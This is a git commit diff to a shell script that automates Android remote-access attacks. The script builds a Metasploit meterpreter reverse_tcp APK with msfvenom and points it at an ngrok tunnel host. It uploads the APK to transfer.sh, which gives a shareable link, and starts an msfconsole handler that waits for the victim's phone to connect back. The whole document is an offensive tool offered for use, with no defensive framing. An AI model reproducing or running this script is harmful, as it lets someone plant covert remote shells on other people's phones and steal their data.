6f35882dc7105821e46a57925798c76f1fc1e964
Arun Chaudhary <arun.11601678@lpu.in>
2018-02-12 16:34:08 +0530

    Update linux.sh

--- linux.sh
+++ linux.sh
@@ -4,15 +4,17 @@ clear
 printf "\033[1;31m*** Android Reverse TCP over WAN using NGROK ***\033[0m\n"
 echo -e "\t*** https://github.com/its-arun ***"
 sleep 3.5;
+#Change value pload to use different reverse_tcp payload
+pload=android/meterpreter/reverse_tcp;
 rport=$( curl -sS http://localhost:4040/api/tunnels | jq '.tunnels[0].public_url' | cut -d ":" -f 3 | sed 's/\"//g' );
-msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$rport R >$(pwd)/payload.apk
+msfvenom -p $pload LHOST=0.tcp.ngrok.io LPORT=$rport R >$(pwd)/payload.apk
 echo "Payload Generated";
 ulink=$( curl -sS --upload-file ./payload.apk https://transfer.sh/payload.apk );
 echo "Payload APK uploaded at " $ulink;
 echo "Starting msfconsole"
 touch auto.rc
 echo "use exploit/multi/handler
-set PAYLOAD android/meterpreter/reverse_tcp
+set PAYLOAD $pload
 set LHOST 127.0.0.1
 set LPORT 4569
 exploit" > auto.rc
